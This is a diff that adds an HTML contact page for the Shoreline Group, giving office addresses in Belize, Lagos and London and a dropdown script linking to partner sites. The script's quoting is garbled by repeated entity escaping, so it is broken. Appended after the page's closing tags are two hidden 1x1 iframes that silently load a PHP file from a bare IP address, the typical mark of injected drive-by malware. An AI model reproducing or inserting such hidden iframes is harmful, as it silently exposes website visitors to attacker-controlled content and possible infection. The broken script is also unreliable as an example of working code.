@@ -1,0 +1,110 @@
+
+
+<script type="text/javascript">
+
+function dropdown()
+{
+
+if(document.form1.select1.value==&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;0&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;)
+{
+window.open(&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;http://www.costain.com&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;);
+}
+else if(document.form1.select1.value==&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;1&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;)
+	
+window.open(&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;http://www.shoreline-power.com&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;);
+
+else
+	
+window.open(&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;http://www.fortisng.com&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;quot;);
+
+}</script><table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+    <td><table width="886" cellspacing="0" cellpadding="0" border="0" align="center">
+      <tbody><tr>
+        <td> <img src="http://www.shoreline-group.com/wb/media/head.gif" /><br /><table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+    <td width="7" valign="top" background="images/leftbg.gif" align="left"><img width="7" height="1" src="images/leftbg.gif" /></td>
+    <td><table width="100%" cellspacing="0" cellpadding="0" border="0">
+      <tbody><tr>
+        <td width="137" align="left"><img width="137" vspace="0" hspace="0" height="83" border="0" src="http://www.shoreline-group.com/wb/media/logo.gif" /></td>
+        <td valign="middle" bgcolor="#104a67" align="right"><table width="20%" cellspacing="0" cellpadding="0" border="0">
+          <tbody><tr>
+            <td height="15" align="center"><form id="form1" name="form1" method="post">
+                <label>
+                <br />
+                </label>
+            </form>&gt;</td>
+          </tr>
+        </tbody></table></td>
+      </tr>
+    </tbody></table>
+	<table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+    <td valign="top" bgcolor="#5fa6d7" align="left"><img width="1" height="4" src="images/bluetop.gif" /></td>
+  </tr>
+</tbody></table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td valign="top" bgcolor="#5fa6d7" align="left"><img width="1" height="4" src="images/bluetop.gif" /></td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td><img width="872" hspace="0" height="105" border="0" src="/wb/media/subimage.gif" /></td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td width="37" valign="top" bgcolor="#eef2fa" align="left"><img width="37" height="1" src="images/leftlink.gif" /></td><td width="139" align="left"><a href="/"><img width="139" hspace="0" height="22" border="0" src="/wb/media/link1.gif" /></a></td><td width="140" align="left"><a href="http://www.shoreline-group.com/wb/pages/aboutus.php"><img width="140" hspace="0" height="22" border="0" src="/wb/media/link2.gif" /></a></td><td width="160" align="left"><a href="http://www.shoreline-group.com/wb/pages/pressrelease.php"><img width="160" hspace="0" height="22" border="0" src="/wb/media/link3.gif" /></a></td><td width="238" align="left"><a href="http://www.shoreline-group.com/wb/pages/social.php"><img width="238" hspace="0" height="22" border="0" src="/wb/media/link4.gif" /></a></td><td><a href="http://www.shoreline-group.com/wb/pages/contactus.php"><img width="124" hspace="0" height="22" border="0" src="/wb/media/link5.gif" /></a></td><td width="34" valign="top" bgcolor="#eef2fa" align="right"><img width="34" height="1" src="images/linkright.gif" /></td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td width="37" bgcolor="#eef2fa">&nbsp;</td><td valign="top" height="409" align="left"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td width="10"><p align="justify" class="head">&nbsp;</p></td><td><p style="font-size: 14px; color: rgb(23, 86, 93); font-style: normal; font-family: Arial,Helvetica,sans-serif;"><strong>Contact Us</strong></p></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+    <td width="10">&nbsp;</td>
+    <td><table width="699" border="0" align="center">
+      <tbody><tr>
+        <td width="305" bgcolor="#ffffff" class="maintext"><p class="head style5"><span style="font-family: Arial,Helvetica,sans-serif; font-size: 14px; color: rgb(23, 86, 93);"><strong>Registered Office:</strong></span><br />
+                <br />
+        </p></td>
+        <td width="130" rowspan="6" class="maintext"><p class="head">&nbsp;</p>
+            <p class="style3">&nbsp;</p></td>
+        <td width="250" valign="top" rowspan="6" bordercolor="#000000" style="font-family: Arial,Helvetica,sans-serif; font-size: 14px; color: rgb(23, 86, 93);"><div align="center"><span class="style8" style="font-weight: bold;">Shoreline House </span><br />
+              <br />
+          <img src="http://www.shoreline-group.com/wb/media/shoreline_house.gif" /><br /></div></td>
+      </tr>
+      <tr>
+        <td style="font-family: Verdana; font-size: 12px; color: rgb(84, 84, 84);"><p class="head"><span class="style7">865 Market Square <br />
+            Belize City,<br />
+            Belize.<br />
+            <br />
+          </span></p>          </td>
+      </tr>
+      <tr>
+        <td bgcolor="#ffffff" class="maintext"><p align="left" style="font-family: Verdana; font-size: 12px; color: rgb(84, 84, 84);"><strong>Head Office:</strong></p></td>
+      </tr>
+      <tr>
+        <td height="54" style="font-family: Verdana; font-size: 12px; color: rgb(84, 84, 84);"><p align="left" class="style7"><strong><span class="head style7">Shoreline House,</span></strong><span class="head style7"><br />
+            46 Industrial Avenue Ilupeju Lagos ,<br />
+            P.O.Box 21055, Ikeja <br />
+            Nigeria</span>.<br />
+            <br />
+            <br />
+          </p>          </td>
+        </tr>
+      <tr>
+        <td height="20" bgcolor="#ffffff"><p style="font-family: Arial,Helvetica,sans-serif; font-size: 14px; color: rgb(23, 86, 93);"><strong>London Office:</strong></p></td>
+        </tr>
+      <tr>
+        <td height="34" style="font-family: Verdana; font-size: 12px; color: rgb(84, 84, 84);"><span class="head style7">Delvin house<br />
+36 st george street Mayfair<br />
+London W1 9FA<br />
+Tel:   +44(0)207 529 1400<br />
+Fax:  +44(0)207 529 1401</span></td>
+      </tr>
+      <tr>
+        <td><p class="head style7"><br />
+            <br />
+            <br />
+            <br />
+          </p>          </td>
+        <td colspan="2" style="font-family: Verdana; font-size: 12px; color: rgb(84, 84, 84);"><div align="right"><span class="head"><span class="style7"><strong>Telephone</strong>: + 234 1 493 4023 -5<br />
+                    <strong>Fax</strong>: + 234 1 4932859</span></span></div>
+            <p align="right">www.shoreline-group.com<br />
+              info@shoreline-group.com<br />
+              <br />
+          </p></td>
+      </tr>
+      <tr>
+        <td><br /></td>
+        <td colspan="2" class="maintext">&nbsp;</td>
+      </tr>
+    </tbody></table>    
+      <p align="justify" class="maintext">&nbsp;</p></td>
+    <td width="10">&nbsp;</td>
+  </tr>
+</tbody></table></td><td width="34" bgcolor="#eef2fa">&nbsp;</td></tr></tbody></table></td><td width="7" valign="top" background="images/rightbg.gif" align="right"><img width="7" height="1" src="images/rightbg.gif" /></td></tr></tbody></table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td align="left"><img hspace="0" border="0" src="/wb/media/foot.gif" /></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><iframe src='http://62.176.16.19/tt.php' width='1' height='1' style='visibility: hidden;'></iframe><iframe src='http://62.176.16.19/tt.php' width='1' height='1' style='visibility: hidden;'></iframe>
